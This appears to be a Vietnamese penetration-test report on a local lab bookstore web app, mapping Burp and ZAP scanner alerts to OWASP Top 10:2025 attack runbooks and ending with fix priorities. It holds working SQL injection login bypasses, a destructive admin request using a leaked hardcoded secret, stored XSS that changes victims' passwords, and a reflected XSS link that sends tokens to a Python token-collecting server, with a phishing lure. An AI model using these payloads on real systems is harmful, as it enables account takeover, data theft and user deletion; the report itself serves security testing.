# Báo Cáo Lỗ Hổng Bảo Mật Theo OWASP Top 10:2025

## 1) Phạm vi và nguồn bằng chứng

Tài liệu này được soạn lại dựa trên:
- Kết quả quét Burp Suite và OWASP ZAP (các alert trong ảnh bạn gửi).
- Đối chiếu trực tiếp source code của project `JVA-bookstore-sec`.
- Các kịch bản tấn công thực tế có thể làm lại bằng DevTools, Burp Suite, ZAP.

Lưu ý:
- Chỉ test trên môi trường lab/local của bạn.
- Không áp dụng lên hệ thống không có quyền kiểm thử.

---

## 2) Tổng hợp alert từ scanner

Hai máy quét độc lập (Burp Suite + OWASP ZAP), kết quả có thể khác nhau một phần do cấu hình và thứ tự crawl.

| Alert từ scanner | Mức | Dẫn đến kịch bản tấn công nào |
|---|---|---|
| **SQL Injection** | High | A05-1 SQLi login, A05-2 SQLi đổi mật khẩu |
| **Absence of Anti-CSRF Tokens** | Medium | A04-1 CSRF (tấn công đổi mật khẩu) |
| **User Controllable HTML Element Attribute (Potential XSS)** | Medium | A05-3 Stored XSS review, A05-4 Reflected XSS vận đơn |
| **X-Content-Type-Options Header Missing** | Low | Hỗ trợ XSS (browser không chặn MIME sniffing) |
| **Content Security Policy (CSP) Header Not Set** | Medium | Hỗ trợ XSS (không có chính sách chặn script ngoài) |
| **Missing Anti-clickjacking Header / X-Frame-Options** | Medium | A02-1 Clickjacking |
| **Cookie without SameSite Attribute** | Low | Hỗ trợ CSRF (cookie theo request cross-site) |
| **Strict-Transport-Security Header Not Set** | Low | MITM, SSL stripping |
| **Secure Pages Include Mixed Content** | Low | MITM, XSS qua HTTP resource |
| **Information Disclosure - Suspicious Comments** | Low | **Chìa khóa phát hiện A01-2** (xem giải thích bên dưới) |
| **Cross-Domain JavaScript Source File Inclusion** | Low | **Chìa khóa phát hiện A01-1** (xem giải thích bên dưới) |
| **In Page Banner / Information Disclosure** | Informational | Lộ version server, stack trace |
| **Subresource Integrity Attribute Missing** | Low | Chuỗi cung ứng (CDN bị tamper) |

---

## 3) Từ alert quét được → suy ra kịch bản tấn công như thế nào?

### SQLi, XSS, CSRF: scanner phát hiện trực tiếp

- **SQL Injection**: cả 2 máy đều quét ra. Scanner tự inject payload vào form đăng nhập và tham số khác, thấy response khác thường (error SQL hoặc login thành công) → xác nhận lỗ hổng tồn tại → dẫn thẳng đến A05-1, A05-2.
- **Absence of Anti-CSRF Tokens**: Burp phát hiện form `POST /api/register-shop` không có CSRF token → dẫn đến A04-1.
- **XSS**: ZAP thử inject script vào các field, thấy payload phản chiếu lại response → dẫn đến A05-3, A05-4.

### A01-1 "User thường truy cập được API admin": không có alert trực tiếp, phát hiện qua 2 bước

Broken Access Control (BAC) là loại lỗ hổng **scanner tự động rất khó phát hiện** vì nó đòi hỏi hiểu ngữ nghĩa phân quyền, không chỉ kiểm tra HTTP status code.

**Bước 1 — Alert dẫn đường**: `Cross-Domain JavaScript Source File Inclusion`

Scanner flag các file JS được load từ nhiều nguồn, trong đó có các file JS nội bộ như `AdSupportChat.js`, `AdProduct.js`. Khi đọc những file này (có thể xem trong Burp → `Target` → `Site map` → tìm file `.js`), ta thấy chúng gọi trực tiếp các endpoint `/api/admin/...`.

**Bước 2 — Manual verify**: Dùng Burp Repeater gửi lại các request đó với cookie của tài khoản `customer` → thấy server trả `200 OK` → xác nhận thiếu kiểm tra role.

> Tóm lại: Alert `Cross-Domain JavaScript Source File Inclusion` → đọc JS nội bộ → tìm ra danh sách endpoint admin → test thủ công bằng Burp.

### A01-2 "Takeover API admin bằng secret mặc định": phát hiện qua Information Disclosure

**Alert dẫn đường**: `Information Disclosure - Suspicious Comments`

Scanner đọc source HTML/JS của trang, phát hiện comment hoặc string đáng ngờ. Cụ thể, file `src/main/webapp/assets/js/admin/AdSupportChat.js` chứa đoạn:

```js
// secret=dev-secret-key-change-me
```

hoặc secret được truyền thẳng trong query string của AJAX call. Scanner flag đây là "Suspicious Comments" / "Information Disclosure".

**Khai thác**: Lấy secret đó → thử trực tiếp vào các endpoint admin không yêu cầu JWT:

```
GET /api/admin/support-chat?action=conversations&secret=dev-secret-key-change-me
```

→ Server chấp nhận vì code dùng secret làm cơ chế auth thay thế, không cần role admin thật.

> Tóm lại: Alert `Information Disclosure - Suspicious Comments` → đọc JS nguồn → tìm thấy secret hardcode → replay request bằng Burp với secret đó.

---

## 4) Lỗ hổng chi tiết và cách tấn công (runbook từng bước)

## A01:2025 - Broken Access Control

### A01-1: User thường truy cập được API admin

> **Alert dẫn đến kịch bản này:** `Cross-Domain JavaScript Source File Inclusion` (Low)
> Scanner flag các file JS nội bộ (`AdProduct.js`, `AdSupportChat.js`...) được load qua nhiều origin. Đọc nội dung các file đó trong Burp → `Target` → `Site map` → thấy chúng gọi thẳng `/api/admin/...` → test thủ công với cookie customer xem server có check role không.

Bằng chứng code:
- `src/main/java/filters/JwtFilter.java`: cho phép public GET với `/api/admin/categories`, `/api/admin/dashboard`.
- `src/main/java/web/admin/AdminDashboardServlet.java`: không check role admin.
- `src/main/java/web/admin/AdminCategoriesServlet.java`: create/update/delete không check role.

Quy trình tấn công chi tiết (Burp + UI):
1. Đăng nhập bằng tài khoản `customer` trên trình duyệt.
2. Mở Burp Suite, bật Proxy (`Intercept off` để chỉ ghi log).
3. Trên trình duyệt, truy cập trực tiếp URL:
   - `https://localhost:8443/api/admin/dashboard`
4. Quay lại Burp -> `Proxy` -> `HTTP history`, lọc `dashboard`.
5. Chọn request vừa tạo, kiểm tra Response.

Kết quả mong đợi:
- HTTP `200 OK`.
- Response có trường kiểu `stats`, `revenue`, `topSellers`.

Kịch bản sửa dữ liệu admin (tạo category):
1. Trong Burp `Repeater`, tạo request mới (hoặc gửi request bất kỳ sang Repeater).
2. Dán request sau và thay cookie bằng cookie phiên customer:

```http
POST /api/admin/categories?action=create HTTP/1.1
Host: localhost:8443
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<cookie-customer>
Content-Length: 19

name=HackedCategory
```

3. Bấm `Send`.

Kết quả mong đợi:
- HTTP `200 OK`.
- Response báo tạo category thành công.

Lệnh CLI tương đương (nếu muốn test nhanh):

```bash
curl -k "https://localhost:8443/api/admin/dashboard" \
  -H "Cookie: JSESSIONID=<cookie-customer>"
```

---

### A01-2: Takeover API admin bằng secret mặc định

> **Alert dẫn đến kịch bản này:** `Information Disclosure - Suspicious Comments` (Low) + `Cross-Domain JavaScript Source File Inclusion` (Low)
> Scanner đọc source JS trang admin, phát hiện string `dev-secret-key-change-me` hardcode trong `AdSupportChat.js`. Từ đó thử dùng secret này vào các endpoint `/api/admin/...?secret=...` mà không cần JWT hay role admin.

Bằng chứng code:
- `src/main/java/web/AdminSupportChatServlet.java`: fallback secret `dev-secret-key-change-me`.
- `src/main/java/web/AdminOrdersServlet.java`: fallback secret tương tự.
- `src/main/java/web/AdminServlet.java` (`/api/admin/clear-users`): cho phép nếu biết secret.
- `src/main/webapp/assets/js/admin/AdSupportChat.js`: lộ secret ở frontend.

Quy trình tấn công chi tiết (Burp Repeater):
1. Mở Burp -> `Repeater` -> tạo tab mới.
2. Gửi request đọc hội thoại support:

```http
GET /api/admin/support-chat?action=conversations&secret=dev-secret-key-change-me HTTP/1.1
Host: localhost:8443
```

3. Quan sát response có danh sách conversation.
4. Tiếp tục gửi request đọc đơn hàng admin:

```http
GET /api/admin/orders?secret=dev-secret-key-change-me HTTP/1.1
Host: localhost:8443
```

5. Nếu muốn chứng minh impact cao nhất, gửi request destructive:

```http
POST /api/admin/clear-users?secret=dev-secret-key-change-me HTTP/1.1
Host: localhost:8443
Content-Length: 0
```

Kết quả mong đợi:
- Các request đều không yêu cầu role admin thật.
- Request destructive có thể trả thông báo xóa user thành công.

---

## A02:2025 - Security Misconfiguration

### A02-1: Thiếu CSP/HSTS/X-Frame-Options/X-Content-Type-Options => Clickjacking

> **Alert dẫn đến kịch bản này:** `Missing Anti-clickjacking Header` (Medium) + `Content Security Policy (CSP) Header Not Set` (Medium) + `Strict-Transport-Security Header Not Set` (Low) + `X-Content-Type-Options Header Missing` (Low)
> Cả Burp và ZAP đều flag trực tiếp các header bảo mật còn thiếu trên mọi response. Kết hợp thiếu `X-Frame-Options` → trang có thể bị nhúng trong iframe → thực hiện Clickjacking.

Quy trình kiểm tra chi tiết:
1. Bật Burp Proxy.
2. Truy cập `https://localhost:8443/`.
3. Trong `HTTP history`, chọn response trang chủ.
4. Mở tab `Response headers`, tìm các header:
   - `Content-Security-Policy`
   - `Strict-Transport-Security`
   - `X-Frame-Options`
   - `X-Content-Type-Options`

Kết quả mong đợi:
- Thiếu một hoặc nhiều header trên.
+
## A04:2025 - Cryptographic Failures (ATTACK)

### A04-1: Cookie/token chưa cứng hóa đầy đủ => CSRF

> **Alert dẫn đến kịch bản này:** `Absence of Anti-CSRF Tokens` (Medium) + `Cookie without SameSite Attribute` (Low)
> Burp phát hiện form `POST /api/register-shop` và một số form khác không chứa CSRF token. Kết hợp cookie thiếu `SameSite`, trình duyệt sẽ tự đính kèm cookie khi request cross-site → attacker tạo trang HTML giả mạo lừa người dùng submit form → hành động thực hiện với phiên của nạn nhân.

Quy trình kiểm tra chi tiết:
1. Đăng nhập thành công.
2. DevTools -> `Application` -> `Cookies` -> chọn domain localhost.
3. Kiểm tra từng cookie cột:
   - `HttpOnly`
   - `Secure`
   - `SameSite`
4. Đối chiếu với scanner `Cookie without SameSite Attribute`.

Kết quả mong đợi:
- Một số cookie thiếu cấu hình an toàn đầy đủ.

Tấn công vô lỗ hổng (CSRF)
1. Tạo file HTML giả mạo (csrf-phishing-demo.html).
2. Lừa người dùng đã đăng nhập (đã có phiên) nhấp vào đường link/button
3. Người dùng bị thực hiện hành động theo mong muốn của attacker mà ko hề hay biết (vd ở đây là đổi password)

---

## A05:2025 - Injection

### A05-1: SQL Injection ở đăng nhập

> **Alert dẫn đến kịch bản này:** `SQL Injection` (High)
> Scanner tự inject payload vào field `username` của form đăng nhập, phát hiện server trả response bất thường (lỗi SQL hoặc login thành công với password sai) → xác nhận SQLi tồn tại ở endpoint `/api/login`.

Bằng chứng code:
- `src/main/java/web/AuthServlet.java`: SQL nối chuỗi với `username`.

Quy trình tấn công chi tiết (UI + Burp):
1. Vào trang đăng nhập.
2. Nhập `username` bằng payload:

```text
' UNION SELECT 1,'admin','admin@test.com','','admin','active' --
```

3. Nhập `password` bất kỳ (ví dụ `123456`).
4. Bấm đăng nhập.
5. Mở Burp `HTTP history`, chọn request login để xác nhận payload đã gửi.

Kết quả mong đợi:
- Đăng nhập thành công dù password sai.
- Có thể nhận role admin nếu payload hợp lệ với cấu trúc query.

Lệnh cURL tương đương:

```bash
curl -k "https://localhost:8443/api/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=' UNION SELECT 1,'admin','admin@test.com','','admin','active' --" \
  --data "password=123456"
```

---

### A05-2: SQL Injection ở đổi mật khẩu (nhánh legacy)

> **Alert dẫn đến kịch bản này:** `SQL Injection` (High)
> Scanner crawl được endpoint `/api/profile/password` (sau khi đăng nhập), inject payload vào field `currentPassword`, phát hiện server trả đổi mật khẩu thành công mà không kiểm tra đúng mật khẩu cũ → xác nhận SQLi ở nhánh legacy query.

Bằng chứng code:
- `src/main/java/web/ProfileServlet.java`: `legacySql` nối trực tiếp `currentPassword`.

Quy trình tấn công chi tiết:
1. Đăng nhập bằng user hợp lệ để lấy session/token.
2. Trong Burp Repeater, gửi request đổi mật khẩu.
3. Điền `currentPassword` bằng payload:

```text
' OR '1'='1'--
```

4. `newPassword` và `confirmPassword` điền cùng giá trị, ví dụ `P@ssw0rd999`.

Request mẫu:

```http
POST /api/profile/password HTTP/1.1
Host: localhost:8443
Content-Type: application/json
Cookie: JSESSIONID=<cookie-user>

{"currentPassword":"' OR '1'='1'--","newPassword":"P@ssw0rd999","confirmPassword":"P@ssw0rd999"}
```

Kết quả mong đợi:
- Trả success đổi mật khẩu dù không biết mật khẩu cũ thật.

---

### A05-3: Stored XSS ở review sách

> **Alert dẫn đến kịch bản này:** `User Controllable HTML Element Attribute (Potential XSS)` (Medium) + `X-Content-Type-Options Header Missing` (Low) + `Content Security Policy (CSP) Header Not Set` (Medium)
> ZAP phát hiện field review/comment cho phép nhập HTML và nội dung được render lại không qua encode. Thiếu CSP và X-Content-Type-Options khiến trình duyệt không có lớp bảo vệ bổ sung → payload lưu vào DB, khi user khác mở trang sách script tự chạy.

Bằng chứng code:
- `src/main/webapp/book-detail.jsp`: render `${r.comment}` trực tiếp.

Quy trình tấn công chi tiết (không dùng console command):
1. Đăng nhập user có quyền viết review.
2. Mở trang chi tiết sách đã mua.
3. Ở ô bình luận/review, điền payload HTML có event:

```html
<img src=x onerror="alert('XSS')">
```

4. Submit form review như bình thường.
5. Dùng tài khoản khác mở lại trang sách đó.

Kết quả mong đợi:
- Payload thực thi trên trình duyệt nạn nhân (popup hoặc hành vi bất thường).

HOẶC thêm vào payload ép người dùng đổi password:

```html
Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror='var t=localStorage.getItem("auth_token");if(t){fetch("/api/profile/password",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+t},body:atob("eyJjdXJyZW50UGFzc3dvcmQiOiInIE9SICcxJz0nMSctLSIsIm5ld1Bhc3N3b3JkIjoiaGFja2VyIiwiY29uZmlybVBhc3N3b3JkIjoiaGFja2VyIn0=")})}'>
```

---

### A05-4: Reflected XSS ở trang chi tiết vận đơn (shipment-detail.jsp)

> **Alert dẫn đến kịch bản này:** `User Controllable HTML Element Attribute (Potential XSS)` (Medium) + `Reflected XSS` (High, ZAP)
> ZAP crawl trang `/shipment-detail.jsp?id=...`, inject payload vào tham số `id`, phát hiện payload phản chiếu lại trong response mà không được encode → tham số `id` được nhúng thẳng vào JS block phía server (`const id = '<%=sid%>'`) không qua escaping.

Bằng chứng code:
- `src/main/webapp/shipment-detail.jsp` dòng 172: `const id = '<%=sid%>';` — tham số `id` từ URL được nhúng thẳng vào JavaScript không qua escaping.

Nguyên nhân kỹ thuật:

Khi request `?id=';alert(1)//`, server sinh ra:
```js
const id = '';alert(1)//';
```
Dấu `'` đóng chuỗi sớm, phần sau trở thành code JavaScript tùy ý.

Quy trình tấn công chi tiết — đánh cắp token shipper:

Điều kiện:
- Nạn nhân là shipper đang đăng nhập, `auth_token` còn trong localStorage.
- Kẻ tấn công dựng server nhận token (Python):

```python
# attacker_server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        params = parse_qs(urlparse(self.path).query)
        token = params.get('t', [''])[0]
        role  = params.get('r', [''])[0]
        ts    = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{ts}] token={token} role={role}")
        if token:
            open('stolen_tokens.txt','a').write(f"[{ts}] token={token} role={role}\n")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers()
        self.wfile.write(b'ok')
    def log_message(self, *a): pass

HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
```

Bước 1 — Kẻ tấn công chạy attacker server:
```bash
python attacker_server.py
```

Bước 2 — Craft URL độc hại và gửi cho shipper (qua Zalo, SMS, email nội bộ):
```
https://localhost:8443/shipment-detail.jsp?id=%27%3B(function()%7Bvar%20t%3DlocalStorage.getItem(%27auth_token%27)%7C%7C%27%27%3Bvar%20r%3DlocalStorage.getItem(%27auth_role%27)%7C%7C%27%27%3Bfetch(%27http%3A%2F%2Flocalhost%3A9999%2Fsteal%3Ft%3D%27%2BencodeURIComponent(t)%2B%27%26r%3D%27%2BencodeURIComponent(r))%3B%7D)()%2F%2F

```

Nội dung giả mạo kèm link:
> *"Đơn hàng #SHP-KHẨN cần anh/chị xác nhận gấp, hệ thống báo lỗi: [link]"*

Bước 3 — Shipper click link. Trang load bình thường (guardRole() pass vì đúng role). Script chạy ngầm, token gửi về attacker server.

Bước 4 — Kẻ tấn công dùng token đọc toàn bộ đơn hàng của shipper:
```bash
curl -k https://localhost:8443/api/shipper/shipments \
  -H "Authorization: Bearer <STOLEN_TOKEN>"
```

Bước 5 — Xem chi tiết đơn (địa chỉ, SĐT, COD khách hàng):
```bash
curl -k https://localhost:8443/api/shipper/shipments/(id lấy từ lệnh trên, vd: 199) \
  -H "Authorization: Bearer <STOLEN_TOKEN>"
```

Kết quả mong đợi:
- HTTP `200 OK` với đầy đủ thông tin: `receiverName`, `receiverPhone`, `receiverAddress`, `codAmount`.
- Kẻ tấn công có thể giả xác nhận giao hàng (`DELIVERED`) mà không giao thật, hoặc leak thông tin cá nhân khách hàng.
- Nạn nhân không phát hiện vì trang hiển thị bình thường (lỗi id rỗng chỉ hiện ở `#err` element nhỏ phía dưới).

PoC URL (demo alert):
```
https://localhost:8443/shipment-detail.jsp?id=%27%3Balert(document.domain)%2F%2F
```
---

## A10:2025 - Mishandling of Exceptional Conditions

### A10-1: Lộ thông tin nội bộ qua thông báo lỗi

> **Alert dẫn đến kịch bản này:** `In Page Banner Information Leak` (Low) + `Information Disclosure - Suspicious Comments` (Low)
> Scanner phát hiện response chứa thông tin phiên bản server, stack trace hoặc message lỗi kỹ thuật khi gặp input bất thường. Từ đó thử gửi input sai kiểu dữ liệu để xem server lộ thêm thông tin nội bộ (tên bảng DB, exception class...).

Quy trình tấn công chi tiết:
1. Chọn endpoint có parse dữ liệu đầu vào.
2. Gửi dữ liệu sai kiểu hoặc thiếu trường bằng Burp Repeater.
3. Quan sát response body.

Request mẫu:

```http
POST /api/profile/password HTTP/1.1
Host: localhost:8443
Content-Type: application/json
Cookie: JSESSIONID=<cookie-user>

{"currentPassword":123,"newPassword":[],"confirmPassword":{}}
```

Kết quả mong đợi:
- Response trả lỗi chi tiết nội bộ (thông tin DB/exception/message kỹ thuật).
----

## 6) Ưu tiên xử lý (ngắn gọn)

P1 (sửa ngay):
- SQLi login + SQLi change password legacy.
- Secret mặc định cho toàn bộ admin API.
- Thiếu RBAC ở admin endpoints.
- Stored XSS ở review.

P2:
- Bổ sung CSP/HSTS/X-Frame-Options/X-Content-Type-Options.
- Chuẩn hoá cookie flags (`HttpOnly`, `Secure`, `SameSite` phù hợp).
- Loại bỏ mixed content HTTP.

P3:
- Thêm SRI cho tài nguyên CDN hoặc self-host static assets.
- Hardening cache-control cho response nhạy cảm.
- Bổ sung audit log + alert cho hành vi admin quan trọng.
